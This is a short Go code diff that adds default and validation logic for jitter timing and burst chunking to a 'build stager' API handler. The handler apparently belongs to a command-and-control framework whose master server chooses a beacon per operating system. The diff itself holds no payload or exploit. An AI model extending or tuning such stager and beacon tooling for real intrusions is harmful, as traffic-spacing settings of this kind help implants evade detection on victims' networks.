@@ -265,6 +265,24 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
+	// Validate timing parameters with sensible defaults
+	if req.JitterMinMs <= 0 {
+		req.JitterMinMs = 60000 // 60 seconds default
+	}
+	if req.JitterMaxMs <= 0 {
+		req.JitterMaxMs = 120000 // 120 seconds default
+	}
+	if req.JitterMaxMs < req.JitterMinMs {
+		api.sendError(w, http.StatusBadRequest, "jitter_max_ms must be >= jitter_min_ms")
+		return
+	}
+	if req.ChunksPerBurst <= 0 {
+		req.ChunksPerBurst = 5 // 5 chunks per burst default
+	}
+	if req.BurstPauseMs < 0 {
+		req.BurstPauseMs = 120000 // 120 seconds default
+	}
+
 	// Note: client_binary_id is optional and just for UI tracking
 	// The Master will automatically select the appropriate beacon based on OS when stager runs
 	if req.ClientBinaryID != "" {
